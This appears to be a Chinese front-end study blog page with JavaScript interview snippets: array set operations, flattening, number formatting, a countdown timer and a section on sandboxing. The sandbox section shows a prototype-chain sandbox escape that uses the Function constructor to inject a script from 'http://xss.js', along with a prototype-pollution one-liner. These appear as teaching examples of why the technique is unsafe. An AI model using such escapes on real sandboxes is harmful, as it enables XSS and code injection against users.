//从第一个字符开始 因为第0个是?号 获取所有除问号的所有符串</span><br><span class="line">                  strs = str.split(&quot;=&quot;);? //用等号进行分隔 （因为知道只有一个参数 </span><br><span class="line">                                          //所以直接用等号进分隔 如果有多个参数 要用&amp;号分隔 再用等号进行分隔）</span><br><span class="line">                  alert(strs[1]);???? //直接弹出第一个参数 （如果有多个参数 还要进行循环的）</span><br><span class="line">         &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="js中两个数组怎么取交集-差集、并集、补集"><a href="#js中两个数组怎么取交集-差集、并集、补集" class="headerlink" title="js中两个数组怎么取交集+(差集、并集、补集)"></a>js中两个数组怎么取交集+(差集、并集、补集)</h1><ol><li>最普遍的做法<blockquote><p>使用 ES5 语法来实现虽然会麻烦些，但兼容性最好，不用考虑浏览器 JavaScript 版本。也不用引入其他第三方库。</p></blockquote></li></ol><p><strong>直接使用 filter、concat 来计算</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">//交集</span><br><span class="line">var c = a.filter(function(v)&#123; return b.indexOf(v) &gt; -1 &#125;)</span><br><span class="line">//差集</span><br><span class="line">var d = a.filter(function(v)&#123; return b.indexOf(v) == -1 &#125;)</span><br><span class="line">//补集</span><br><span class="line">var e = a.filter(function(v)&#123; return !(b.indexOf(v) &gt; -1) &#125;)</span><br><span class="line">        .concat(b.filter(function(v)&#123; return !(a.indexOf(v) &gt; -1)&#125;))</span><br><span class="line">//并集</span><br><span class="line">var f = a.concat(b.filter(function(v)&#123; return !(a.indexOf(v) &gt; -1)&#125;));</span><br></pre></td></tr></table></figure><p><strong>对 Array 进行扩展</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">//数组功能扩展</span><br><span class="line">//数组迭代函数</span><br><span class="line">Array.prototype.each = function(fn)&#123;</span><br><span class="line">  fn = fn || Function.K;</span><br><span class="line">   var a = [];</span><br><span class="line">   var args = Array.prototype.slice.call(arguments, 1);</span><br><span class="line">   for(var i = 0; i &lt; this.length; i++)&#123;</span><br><span class="line">       var res = fn.apply(this,[this[i],i].concat(args));</span><br><span class="line">       if(res != null) a.push(res);</span><br><span class="line">   &#125;</span><br><span class="line">   return a;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//数组是否包含指定元素</span><br><span class="line">Array.prototype.contains = function(suArr)&#123;</span><br><span class="line">  for(var i = 0; i &lt; this.length; i ++)&#123;</span><br><span class="line">      if(this[i] == suArr)&#123;</span><br><span class="line">          return true;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//不重复元素构成的数组</span><br><span class="line">Array.prototype.uniquelize = function()&#123;</span><br><span class="line">   var ra = new Array();</span><br><span class="line">   for(var i = 0; i &lt; this.length; i ++)&#123;</span><br><span class="line">      if(!ra.contains(this[i]))&#123;</span><br><span class="line">          ra.push(this[i]);</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">   return ra;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的交集</span><br><span class="line">Array.intersect = function(a, b)&#123;</span><br><span class="line">   return a.uniquelize().each(function(o)&#123;return b.contains(o) ? o : null&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的差集</span><br><span class="line">Array.minus = function(a, b)&#123;</span><br><span class="line">   return a.uniquelize().each(function(o)&#123;return b.contains(o) ? null : o&#125;);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组的补集</span><br><span class="line">Array.complement = function(a, b)&#123;</span><br><span class="line">   return Array.minus(Array.union(a, b),Array.intersect(a, b));</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">//两个数组并集</span><br><span class="line">Array.union = function(a, b)&#123;</span><br><span class="line">   return a.concat(b).uniquelize();</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ol start="2"><li>使用 ES6 语法实现</li></ol><p>ES6 中可以借助扩展运算符（…）以及 Set 的特性实现相关计算，代码也会更加简单些。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">console.log(&quot;数组a：&quot;, a);</span><br><span class="line">console.log(&quot;数组b：&quot;, b);</span><br><span class="line"></span><br><span class="line">var sa = new Set(a);</span><br><span class="line">var sb = new Set(b);</span><br><span class="line"></span><br><span class="line">// 交集</span><br><span class="line">let intersect = a.filter(x =&gt; sb.has(x));</span><br><span class="line"></span><br><span class="line">// 差集</span><br><span class="line">let minus = a.filter(x =&gt; !sb.has(x));</span><br><span class="line"></span><br><span class="line">// 补集</span><br><span class="line">let complement  = [...a.filter(x =&gt; !sb.has(x)), ...b.filter(x =&gt; !sa.has(x))];</span><br><span class="line"></span><br><span class="line">// 并集</span><br><span class="line">let unionSet = Array.from(new Set([...a, ...b]));</span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li>使用 jQuery 实现</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">var a = [1,2,3,4,5]</span><br><span class="line">var b = [2,4,6,8,10]</span><br><span class="line">console.log(&quot;数组a：&quot;, a);</span><br><span class="line">console.log(&quot;数组b：&quot;, b);</span><br><span class="line"></span><br><span class="line">// 交集</span><br><span class="line">let intersect = $(a).filter(b).toArray();</span><br><span class="line">// 差集</span><br><span class="line">let minus = $(a).not(b).toArray();</span><br><span class="line">// 补集</span><br><span class="line">let complement  = $(a).not(b).toArray().concat($(b).not(a).toArray());</span><br><span class="line">// 并集</span><br><span class="line">let unionSet = $.unique(a.concat(b));</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="用正则和非正则实现123456789-12-》1，234，567，890-12"><a href="#用正则和非正则实现123456789-12-》1，234，567，890-12" class="headerlink" title="用正则和非正则实现123456789.12=》1，234，567，890.12"></a>用正则和非正则实现123456789.12=》1，234，567，890.12</h1><ul><li>非正则：</li></ul><p>如果数字带有小数点的话，可以使用toLocaleString()方法实现这个需求。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">b.toLocaleString();</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>正则：<ol><li>带小数点<ul><li>判读是否带有小数点</li><li>没有小数点，就用正则匹配实</li></ul></li></ol></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function numFormat(num) &#123;</span><br><span class="line">    var c = (num.toString().indexOf (&#x27;.&#x27;) !== -1) ? num.toLocaleString() : </span><br><span class="line">             num.toString().replace(/(\d)(?=(?:\d&#123;3&#125;)+$)/g, &#x27;$1,&#x27;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><pre><code>2. 带小数点    * 判读是否带有小数点    * 没有小数点，就用正则匹配实</code></pre><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function numFormat(num) &#123;</span><br><span class="line">    var c = (num.toString().indexOf (&#x27;.&#x27;) !== -1) ? num.toLocaleString() : </span><br><span class="line">             num.toString().replace(/(\d)(?=(?:\d&#123;3&#125;)+$)/g, &#x27;$1,&#x27;);</span><br><span class="line">    return c;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="写一个判断是否是空对象的函数"><a href="#写一个判断是否是空对象的函数" class="headerlink" title="写一个判断是否是空对象的函数"></a>写一个判断是否是空对象的函数</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function isEmpty(value) &#123;</span><br><span class="line">    return (</span><br><span class="line">        value === null || value === undefined ||</span><br><span class="line">        (typeof value === &#x27;object&#x27; &amp;&amp; Object.keys(value).length === 0) </span><br><span class="line">    )</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="代码题：颜色值16进制转10进制rgb"><a href="#代码题：颜色值16进制转10进制rgb" class="headerlink" title="代码题：颜色值16进制转10进制rgb"></a>代码题：颜色值16进制转10进制rgb</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function toRGB(color) &#123;</span><br><span class="line">    var regex = /^#([0-9a-fA-F]&#123;2&#125;)([0-9a-fA-F]&#123;2&#125;)([0-9a-fA-F]&#123;2&#125;)$/ //匹配十六进制的正则</span><br><span class="line">    match = color.match(regex)  // 判断是否是十六进制颜色值</span><br><span class="line">    return match ? &#x27;rgb(&#x27;+parseInt(match[1], 16)+&#x27;,&#x27;+parseInt(match[2], 16)+&#x27;,&#x27;+parseInt(match[3], 16)+&#x27;)&#x27; : color</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="传入-1-2-3-4-5-，返回-1-2-3-4-5"><a href="#传入-1-2-3-4-5-，返回-1-2-3-4-5" class="headerlink" title="传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]"></a>传入 [1,[[2],3,4],5] ，返回 [1,2,3,4,5]</h1><ol><li>递归</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">// 方法 1</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    var result = [];</span><br><span class="line">    for (var i = 0, len = arr.length; i &lt; len; i++) &#123;</span><br><span class="line">        if (Array.isArray(arr[i])) &#123;</span><br><span class="line">            result = result.concat(flatten(arr[i]))</span><br><span class="line">        &#125;</span><br><span class="line">        else &#123;</span><br><span class="line">            result.push(arr[i])</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return result;</span><br><span class="line">&#125;</span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><ol start="2"><li>toString</li></ol><p>如果<font color="#FF00FF">数组的元素都是数字</font>，那么我们可以考虑使用 toString 方法，因为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[1, [2, [3, 4]]].toString() // &quot;1,2,3,4&quot;</span><br></pre></td></tr></table></figure><p>调用 toString 方法，返回了一个逗号分隔的扁平的字符串，这时候我们再 split，然后转成数字不就可以实现扁平化了</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// 方法2</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.toString().split(&#x27;,&#x27;).map(function(item)&#123;</span><br><span class="line">        return +item</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>而这种方法使用的场景却非常有限，如果数组是 [1, ‘1’, 2, ‘2’] 的话，<font color="#FF00FF">这种方法就会产生错误的结果。</font><br>3. reduce</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// 方法3</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line">    return arr.reduce(function(prev, next)&#123;</span><br><span class="line">        return prev.concat(Array.isArray(next) ? flatten(next) : next)</span><br><span class="line">    &#125;, [])</span><br><span class="line">&#125;</span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><p>4.扩展运算符<br>ES6 增加了扩展运算符，用于取出参数对象的所有可遍历属性，拷贝到当前对象之中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line">console.log([].concat(...arr)); // [1, 2, [3, 4]]</span><br></pre></td></tr></table></figure><p>我们用这种方法只可以扁平一层，但是顺着这个方法一直思考，我们可以写出这样的方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// 方法4</span><br><span class="line">var arr = [1, [2, [3, 4]]];</span><br><span class="line"></span><br><span class="line">function flatten(arr) &#123;</span><br><span class="line"></span><br><span class="line">    while (arr.some(item =&gt; Array.isArray(item))) &#123;</span><br><span class="line">        arr = [].concat(...arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return arr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">console.log(flatten(arr))</span><br></pre></td></tr></table></figure><ol start="5"><li>undercore</li></ol><p>那么如何写一个抽象的扁平函数，来方便我们的开发呢，所有又到了我们抄袭 underscore 的时候了~</p><p>在这里直接给出源码和注释，但是要注意，这里的 flatten 函数并不是最终的 _.flatten，为了方便多个 API 进行调用，这里对扁平进行了更多的配置。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * 数组扁平化</span><br><span class="line"> * @param  &#123;Array&#125; input   要处理的数组</span><br><span class="line"> * @param  &#123;boolean&#125; shallow 是否只扁平一层</span><br><span class="line"> * @param  &#123;boolean&#125; strict  是否严格处理元素，下面有解释</span><br><span class="line"> * @param  &#123;Array&#125; output  这是为了方便递归而传递的参数</span><br><span class="line"> * 源码地址：https://github.com/jashkenas/underscore/blob/master/underscore.js#L528</span><br><span class="line"> */</span><br><span class="line">function flatten(input, shallow, strict, output) &#123;</span><br><span class="line"></span><br><span class="line">    // 递归使用的时候会用到output</span><br><span class="line">    output = output || [];</span><br><span class="line">    var idx = output.length;</span><br><span class="line"></span><br><span class="line">    for (var i = 0, len = input.length; i &lt; len; i++) &#123;</span><br><span class="line"></span><br><span class="line">        var value = input[i];</span><br><span class="line">        // 如果是数组，就进行处理</span><br><span class="line">        if (Array.isArray(value)) &#123;</span><br><span class="line">            // 如果是只扁平一层，遍历该数组，依此填入 output</span><br><span class="line">            if (shallow) &#123;</span><br><span class="line">                var j = 0, length = value.length;</span><br><span class="line">                while (j &lt; length) output[idx++] = value[j++];</span><br><span class="line">            &#125;</span><br><span class="line">            // 如果是全部扁平就递归，传入已经处理的 output，递归中接着处理 output</span><br><span class="line">            else &#123;</span><br><span class="line">                flatten(value, shallow, strict, output);</span><br><span class="line">                idx = output.length;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        // 不是数组，根据 strict 的值判断是跳过不处理还是放入 output</span><br><span class="line">        else if (!strict)&#123;</span><br><span class="line">            output[idx++] = value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return output;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>解释下 strict，</strong> 在代码里我们可以看出，当遍历数组元素时，<font color="#FF00FF">如果元素不是数组，就会对 strict 取反的结果进行判断，如果设置 strict 为 true，就会跳过不进行任何处理，这意味着可以过滤非数组的元素，</font>举个例子：<br>那么设置 strict 到底有什么用呢？不急，我们先看下 shallow 和 strct 各种值对应的结果：</p><ul><li>shallow true + strict false ：正常扁平一层</li><li>shallow false + strict false ：正常扁平所有层</li><li>shallow true + strict true ：去掉非数组元素</li><li>shallow false + strict true ： 返回一个[]</li></ul><h1 id="倒计时，一开始就进行"><a href="#倒计时，一开始就进行" class="headerlink" title="倒计时，一开始就进行"></a>倒计时，一开始就进行</h1><p>一旦进入页面倒计时就开始，因此在window.onload方法中调用倒计时方法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">      window.onload = function () &#123;</span><br><span class="line">          countDown();</span><br><span class="line">          function addZero(i) &#123;</span><br><span class="line">              return i &lt; 10 ? &quot;0&quot; + i: i + &quot;&quot;;</span><br><span class="line">          &#125;</span><br><span class="line">          function countDown() &#123;</span><br><span class="line">              var nowtime = new Date();</span><br><span class="line">              var endtime = new Date(&quot;2019/03/16,17:57:00&quot;);</span><br><span class="line">              var lefttime = parseInt((endtime.getTime() - nowtime.getTime()) / 1000);</span><br><span class="line">              var d = parseInt(lefttime / (24*60*60))</span><br><span class="line">              var h = parseInt(lefttime / (60 * 60) % 24);</span><br><span class="line">              var m = parseInt(lefttime / 60 % 60);</span><br><span class="line">              var s = parseInt(lefttime % 60);</span><br><span class="line">              d = addZero(d)</span><br><span class="line">              h = addZero(h);</span><br><span class="line">              m = addZero(m);</span><br><span class="line">              s = addZero(s);</span><br><span class="line">              document.querySelector(&quot;.count&quot;).innerHTML = `活动倒计时  $&#123;d&#125;天 $&#123;h&#125; 时 $&#123;m&#125; 分 $&#123;s&#125; 秒`;</span><br><span class="line">              if (lefttime &lt;= 0) &#123;</span><br><span class="line">                  document.querySelector(&quot;.count&quot;).innerHTML = &quot;活动已结束&quot;;</span><br><span class="line">                  return;</span><br><span class="line">              &#125;</span><br><span class="line">              setTimeout(countDown, 1000);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="沙箱隔离怎么做的什么原理-TODO"><a href="#沙箱隔离怎么做的什么原理-TODO" class="headerlink" title="沙箱隔离怎么做的什么原理 [TODO]"></a>沙箱隔离怎么做的什么原理 [TODO]</h1><p>沙箱，即sandbox，顾名思义，就是让你的程序跑在一个隔离的环境下，不对外界的其他程序造成影响，通过创建类似沙盒的独立作业环境，在其内部运行的程序并不能对硬盘产生永久性的影响。<br><strong>实现沙箱的三种方法</strong></p><ol><li>借助with + new Function</li></ol><blockquote><p>首先从最简陋的方法说起，假如你想要通过eval和function直接执行一段代码，这是不现实的，因为<font color="#FF00FF">代码内部可以沿着作用域链往上找，篡改全局变量</font>，这是我们不希望的，所以你需要让沙箱内的变量访问都在你的监控范围内；不过，你可<font color="#FF8C00">以使用with API，在with的块级作用域下，变量访问会优先查找你传入的参数对象，之后再往上找，所以相当于你变相监控到了代码中的“变量访问”</font>：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function compileCode (src) &#123;      </span><br><span class="line">  src = &#x27;with (exposeObj) &#123;&#x27; + src + &#x27;&#125;&#x27;    </span><br><span class="line">  return new Function(&#x27;exposeObj&#x27;, src)     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下里你要做的是，就是<font color="#FF00FF">暴露可以被访问的变量exposeObj，以及阻断沙箱内的对外访问</font>。<font color="#FF8C00">通过es6提供的proxy特性</font>，可以获取到对对象上的所有改写：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">function compileCode (src) &#123;      </span><br><span class="line">  src = `with (exposeObj) &#123; $&#123;src&#125; &#125;`    </span><br><span class="line">  return new Function(&#x27;exposeObj&#x27;, src)     </span><br><span class="line">&#125;    </span><br><span class="line">function proxyObj(originObj)&#123;    </span><br><span class="line">    let exposeObj = new Proxy(originObj,&#123;    </span><br><span class="line">        has:(target,key)=&gt;&#123;    </span><br><span class="line">            if([&quot;console&quot;,&quot;Math&quot;,&quot;Date&quot;].indexOf(key)&gt;=0)&#123;    </span><br><span class="line">                return target[key]    </span><br><span class="line">            &#125;    </span><br><span class="line">            if(!target.hasOwnProperty(key))&#123;    </span><br><span class="line">                throw new Error(`Illegal operation for key $&#123;key&#125;`)    </span><br><span class="line">            &#125;    </span><br><span class="line">            return target[key]    </span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;)    </span><br><span class="line">    return exposeObj    </span><br><span class="line"></span><br><span class="line">&#125;    </span><br><span class="line">function createSandbox(src,obj)&#123;    </span><br><span class="line"> let proxy = proxyObj(obj)    </span><br><span class="line"> compileCode(src).call(proxy,proxy) //绑定this 防止this访问window    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过设置has函数，可以监听到变量的访问，在上述代码中，仅暴露个别外部变量供代码访问，其余不存在的属性，都会直接抛出error。其实还存在get、set函数，但是如果get和set函数只能拦截到当前对象属性的操作，对外部变量属性的读写操作无法监听到，所以只能使用has函数了。接下来我们测试一下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">const testObj = &#123;    </span><br><span class="line">    value:1,    </span><br><span class="line">    a:&#123;    </span><br><span class="line">        b:    </span><br><span class="line">    &#125;    </span><br><span class="line">&#125;    </span><br><span class="line">createSandbox(&quot;value=&#x27;haha&#x27;;console.log(a)&quot;,testObj)</span><br></pre></td></tr></table></figure><p>看起来一切似乎没有什么问题，但是问题出在了传入的对象，当调用的是console.log(a.b)的时候，has方法是无法监听到对b属性的访问的，假设所执行的代码是不可信的，这时候，它只需要通过a.b.proto就可以访问到Object构造函数的原型对象，再对原型对象进行一些篡改，例如将toString就能影响到外部的代码逻辑的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">createSandbox(`    </span><br><span class="line">a.b.__proto__.toString = ()=&gt;&#123;    </span><br><span class="line"> new (()=&gt;&#123;&#125;).constructor(&quot;var script = document.createElement(&#x27;script&#x27;);    </span><br><span class="line"> script.src = &#x27;http://xss.js&#x27;;</span><br><span class="line"> script.type = &#x27;text/javascript&#x27;;    </span><br><span class="line"> document.body.appendChild(script);&quot;)()    </span><br><span class="line">&#125;</span><br><span class="line">`,testObj)    </span><br><span class="line">console.log(testObj.a.b.__proto__.toString())</span><br></pre></td></tr></table></figure><p>例如上面所展示的代码，通过访问原型链的方式，实现了沙箱逃逸，并且篡改了原型链上的toString方法，一旦外部的代码执行了toString方法，就可以实现xss攻击，注入第三方代码；由于在内部定义执行的函数代码逻辑，仍然会沿着作用于链查找，为了绕开作用域链的查找，笔者通过访问箭头函数的constructor的方式拿到了构造函数Function，这个时候，Funtion内所执行的xss代码，在执行的时候，便不会再沿着作用域链往上找，而是直接在全局作用域下执行，通过这样的方式，实现了沙箱逃逸以及xss攻击。</p><p>你可能会想，如果我切断原型链的访问，是否就杜绝了呢？的确，你可以通过Object.create(null)的方式，传入一个不含有原型链的对象，并且让暴露的对象只有一层，不传入嵌套的对象，但是，即使是基本类型值，数字或字符串，同样也可以通过proto查找到原型链，而且，即使不传入对象，你还可以通过下面这种方式绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(&#123;&#125;).__proto__.toString= ()=&gt;&#123;console.log(111)&#125;;</span><br></pre></td></tr></table></figure><p>可见，new Function + with的这种沙箱方式，防君子不防小人，当然，你也可以通过对传入的code代码做代码分析或过滤？假如传入的代码不是按照的规定的数据格式（例如json），就直接抛出错误，阻止恶意代码注入，但这始终不是一种安全的做法。<br>2. 借助iframe实现沙箱</p><p>前面介绍一种劣质的、不怎么安全的方法构造了一个简单的沙箱，但是在前端最常见的方法，还是利用iframe来构造一个沙箱</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe sandbox 